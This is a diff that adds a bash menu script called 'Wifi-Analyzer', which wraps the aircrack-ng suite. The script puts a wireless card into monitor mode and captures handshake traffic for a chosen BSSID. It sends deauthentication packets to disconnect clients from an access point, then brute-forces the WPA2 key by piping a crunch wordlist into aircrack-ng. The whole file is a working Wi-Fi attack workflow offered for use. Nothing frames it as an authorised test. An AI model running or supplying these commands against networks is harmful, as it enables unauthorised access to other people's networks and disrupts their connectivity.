@@ -1,0 +1,61 @@
+#!/bin/bash
+while true
+do
+echo "========================"
+echo "Wifi-Analyzer"
+echo "========================"
+echo "Press 1 for airmon-ng"
+echo "press 2 for airodump-ng"
+echo "Press 3 for airodump-ng 2"
+echo "========================"
+echo "New Window"
+echo "========================"
+echo "Press 4 for aireplay-ng"
+echo "Press 5 for aircrack"
+echo "Press q to exit"
+
+
+echo -e "\n"
+echo -e "Enter your Selection"
+read answer
+case "$answer" in
+1)
+airmon-ng start wlan0;
+;;
+
+2)
+airodump-ng wlan0mon
+;;
+3)
+echo "Enter channel"
+read channel;
+echo "========================"
+echo "Enter cap file name"
+read cap;
+echo "========================"
+echo "Enter bssid"
+read bssid;
+airodump-ng -c $channel --write /home/wilbee/Desktop/$cap --bssid $bssid wlan0mon;
+;;
+
+4)
+echo "Enter bssid"
+read bssid2;
+aireplay-ng --deauth 5 -a $bssid2 wlan0mon
+;;
+
+5)
+echo "Enter bssid"
+read bssid3;
+echo "=========================="
+echo "Enter cap file"
+read cap2
+crunch 20 20 abcdefghijklmnopqrstuvwxyz1234567890  | aircrack-ng -a2 -b $bssid3 -w - $cap2 ;
+;;
+q) exit ;;
+esac 
+echo -e "Press enter to continue"
+read input
+done
+
+
